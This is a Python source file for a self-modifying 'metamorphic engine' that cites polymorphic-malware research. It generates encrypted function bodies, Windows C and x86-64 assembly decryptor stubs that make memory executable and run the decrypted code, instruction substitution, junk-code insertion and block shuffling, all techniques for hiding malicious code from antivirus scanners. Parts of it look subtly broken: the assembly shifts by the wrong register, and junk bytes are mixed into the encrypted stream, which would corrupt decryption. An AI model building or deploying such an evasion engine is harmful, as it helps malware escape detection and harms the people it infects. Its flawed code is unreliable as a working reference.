"""
Self-Modifying Code (Metamorphic Engine)
Based on 2026 research: r2morph, Morpheus, Polymorphic Python Malware

Features:
- Runtime code mutation
- XOR encryption of function bodies
- Instruction replacement
- Register shuffling
- Code block reordering
- Junk code insertion
"""

import random
import hashlib
import struct
from typing import List, Tuple

class MetamorphicEngine:
    """Self-modifying code engine that mutates at runtime"""
    
    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
    
    def xor_encrypt_function(self, code: bytes, key: int) -> bytes:
        """XOR encrypt function body"""
        encrypted = bytearray()
        for i, byte in enumerate(code):
            encrypted.append(byte ^ ((key >> (i % 4 * 8)) & 0xFF))
        return bytes(encrypted)
    
    def generate_runtime_decryptor(self, func_addr: int, func_size: int, key: int) -> str:
        """
        Generate runtime decryptor stub
        
        This stub will decrypt the function at runtime before execution
        """
        asm_code = f"""
; Runtime decryptor for self-modifying code
; Decrypts function at {hex(func_addr)} with key {hex(key)}

section .text
global decrypt_function_{func_addr:x}

decrypt_function_{func_addr:x}:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    push rdx
    
    ; Function address
    mov rbx, {hex(func_addr)}
    
    ; Function size
    mov rcx, {func_size}
    
    ; XOR key
    mov edx, {hex(key)}
    
    ; Decrypt loop
    xor rax, rax
.decrypt_loop:
    cmp rax, rcx
    jge .done
    
    ; Load encrypted byte
    mov r8b, byte [rbx + rax]
    
    ; Get key byte (rotate through 4 bytes)
    mov r9, rax
    and r9, 3
    shl r9, 3
    mov r10d, edx
    shr r10d, cl
    
    ; XOR decrypt
    xor r8b, r10b
    
    ; Store decrypted byte
    mov byte [rbx + rax], r8b
    
    inc rax
    jmp .decrypt_loop
    
.done:
    pop rdx
    pop rcx
    pop rbx
    pop rbp
    ret
"""
        return asm_code
    
    def mutate_instruction(self, instruction: bytes) -> bytes:
        """
        Mutate a single instruction to equivalent form
        
        Examples:
        - MOV rax, rbx -> PUSH rbx; POP rax
        - XOR rax, rax -> SUB rax, rax
        - INC rax -> ADD rax, 1
        """
        # Simplified mutation (real implementation would use disassembler)
        mutations = {
            # MOV rax, rbx (48 89 D8)
            b'\x48\x89\xD8': [
                b'\x53\x58',  # PUSH rbx; POP rax
            ],
            # XOR rax, rax (48 31 C0)
            b'\x48\x31\xC0': [
                b'\x48\x29\xC0',  # SUB rax, rax
                b'\x48\x2B\xC0',  # SUB rax, rax (alternate)
            ],
            # INC rax (48 FF C0)
            b'\x48\xFF\xC0': [
                b'\x48\x83\xC0\x01',  # ADD rax, 1
                b'\x48\x8D\x40\x01',  # LEA rax, [rax+1]
            ],
        }
        
        if instruction in mutations:
            return random.choice(mutations[instruction])
        return instruction
    
    def insert_junk_code(self) -> bytes:
        """Generate junk code that has no net effect"""
        junk_patterns = [
            b'\x90',  # NOP
            b'\x48\x87\xC0',  # XCHG rax, rax
            b'\x50\x58',  # PUSH rax; POP rax
            b'\x48\x31\xC0\x48\x31\xC0',  # XOR rax, rax; XOR rax, rax
            b'\x48\x83\xC0\x00',  # ADD rax, 0
        ]
        return random.choice(junk_patterns)
    
    def reorder_basic_blocks(self, blocks: List[bytes]) -> List[bytes]:
        """
        Reorder basic blocks and insert jumps
        
        This maintains functionality while changing code layout
        """
        # Shuffle blocks
        shuffled = blocks.copy()
        random.shuffle(shuffled)
        
        # Insert jumps between blocks (simplified)
        reordered = []
        for i, block in enumerate(shuffled):
            reordered.append(block)
            if i < len(shuffled) - 1:
                # Add jump to next block
                reordered.append(b'\xEB\x00')  # JMP short (placeholder)
        
        return reordered
    
    def generate_metamorphic_stub(self, original_code: bytes) -> Tuple[bytes, int]:
        """
        Generate metamorphic version of code
        
        Returns:
            (mutated_code, decryption_key)
        """
        # Generate random key
        key = random.randint(0x10000000, 0xFFFFFFFF)
        
        # Encrypt original code
        encrypted = self.xor_encrypt_function(original_code, key)
        
        # Insert junk code
        mutated = bytearray()
        for i in range(0, len(encrypted), 4):
            chunk = encrypted[i:i+4]
            mutated.extend(chunk)
            if random.random() < 0.3:  # 30% chance
                mutated.extend(self.insert_junk_code())
        
        return bytes(mutated), key
    
    def create_self_modifying_function(self, func_name: str, func_code: bytes) -> str:
        """
        Create a self-modifying function wrapper
        
        The function will decrypt itself at runtime before execution
        """
        key = random.randint(0x10000000, 0xFFFFFFFF)
        encrypted = self.xor_encrypt_function(func_code, key)
        
        c_code = f"""
// Self-modifying function: {func_name}
// Encrypted at compile-time, decrypts at runtime

#include <windows.h>
#include <stdint.h>

// Encrypted function body
static uint8_t encrypted_{func_name}[] = {{
    {', '.join(f'0x{b:02x}' for b in encrypted)}
}};

static int {func_name}_decrypted = 0;
static uint32_t {func_name}_key = 0x{key:08x};

// Runtime decryptor
static void decrypt_{func_name}(void) {{
    if ({func_name}_decrypted) return;
    
    DWORD old_protect;
    VirtualProtect(encrypted_{func_name}, sizeof(encrypted_{func_name}), 
                   PAGE_EXECUTE_READWRITE, &old_protect);
    
    for (size_t i = 0; i < sizeof(encrypted_{func_name}); i++) {{
        uint8_t key_byte = ({func_name}_key >> ((i % 4) * 8)) & 0xFF;
        encrypted_{func_name}[i] ^= key_byte;
    }}
    
    VirtualProtect(encrypted_{func_name}, sizeof(encrypted_{func_name}), 
                   PAGE_EXECUTE_READ, &old_protect);
    
    {func_name}_decrypted = 1;
}}

// Wrapper function
void {func_name}(void) {{
    decrypt_{func_name}();
    
    // Cast to function pointer and execute
    void (*func)(void) = (void (*)(void))encrypted_{func_name};
    func();
    
    // Optional: Re-encrypt after execution
    // encrypt_{func_name}();
}}
"""
        return c_code

def generate_self_modifying_code(functions: dict, output_file: str = "self_modifying.c"):
    """
    Generate self-modifying code for multiple functions
    
    Args:
        functions: Dictionary of {func_name: func_code_bytes}
        output_file: Output C file path
    """
    engine = MetamorphicEngine()
    
    code_parts = [
        "// Auto-generated self-modifying code",
        "#include <windows.h>",
        "#include <stdint.h>",
        ""
    ]
    
    for func_name, func_code in functions.items():
        code_parts.append(engine.create_self_modifying_function(func_name, func_code))
        code_parts.append("")
    
    with open(output_file, 'w') as f:
        f.write('\n'.join(code_parts))
    
    print(f"[+] Generated self-modifying code: {output_file}")
    print(f"    Functions: {len(functions)}")

if __name__ == "__main__":
    print("=== Self-Modifying Code Engine ===\n")
    
    # Example: Create self-modifying function
    engine = MetamorphicEngine()
    
    # Dummy function code (NOP sled for demonstration)
    func_code = b'\x90' * 16 + b'\xC3'  # NOPs + RET
    
    # Generate metamorphic version
    mutated, key = engine.generate_metamorphic_stub(func_code)
    
    print(f"[+] Original size: {len(func_code)} bytes")
    print(f"[+] Mutated size: {len(mutated)} bytes")
    print(f"[+] Encryption key: 0x{key:08x}")
    print(f"[+] Junk code added: {len(mutated) - len(func_code)} bytes")
